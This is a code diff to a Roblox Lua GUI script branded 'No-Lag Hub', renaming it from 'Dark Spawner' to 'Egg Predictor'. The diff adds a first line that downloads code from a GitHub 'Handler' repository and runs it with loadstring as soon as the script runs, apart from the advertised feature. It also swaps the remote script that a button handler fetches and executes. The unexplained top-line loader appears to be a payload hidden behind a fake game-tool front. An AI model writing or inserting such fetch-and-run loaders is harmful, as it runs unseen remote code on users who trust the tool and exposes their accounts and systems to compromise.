@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/Handler/refs/heads/main/df75aa195083802b274b6dbeab970928.txt"))()
+
 local TweenService = game:GetService("TweenService")
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "ex0ontop"
@@ -146,7 +148,7 @@ Header.Position = UDim2.new(0, 0, 0.032, 0)
 Header.Size = UDim2.new(0.8, 0, 0.052, 0)
 Header.Font = Enum.Font.GothamBold
 Header.RichText = true
-Header.Text = "No-Lag Hub x Dark Spawner | Version 1.0"
+Header.Text = "No-Lag Hub x Egg Predictor | Version 2.0"
 Header.TextScaled = true
 Header.TextColor3 = Color3.fromRGB(255, 255, 255)
 Header.TextTransparency = 1
@@ -298,7 +300,7 @@ DS.Size = UDim2.new(0.8, 0, 0.18, 0)
 DS.ZIndex = 2
 DS.Font = Enum.Font.GothamBold
 DS.RichText = true
-DS.Text = "DARK SPAWNER!"
+DS.Text = "EGG PREDICTOR!"
 DS.TextColor3 = Color3.fromRGB(255, 255, 255)
 DS.TextScaled = true
 DS.TextTransparency = 1
@@ -315,7 +317,7 @@ DSS.Position = UDim2.new(0.1, 0, 0.77, 0)
 DSS.Size = UDim2.new(0.8, 0, 0.18, 0)
 DSS.Font = Enum.Font.GothamBold
 DSS.RichText = true
-DSS.Text = "DARK SPAWNER!"
+DSS.Text = "EGG PREDICTOR!"
 DSS.TextColor3 = Color3.fromRGB(0, 0, 0)
 DSS.TextScaled = true
 DSS.TextTransparency = 1
@@ -509,7 +511,7 @@ local function handler()
 	TweenInfoOfSlide.Completed:Wait()
 	task.spawn(function()
 		local success, err = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/Handler/refs/heads/main/17cfae2e620ab9b88ad2b87218e7cceb.txt"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLagHub-PetSpawner/Visual-EggPredictor/refs/heads/main/lua"))()
 		end)
 		loadSuccess = success
 		loadError = err
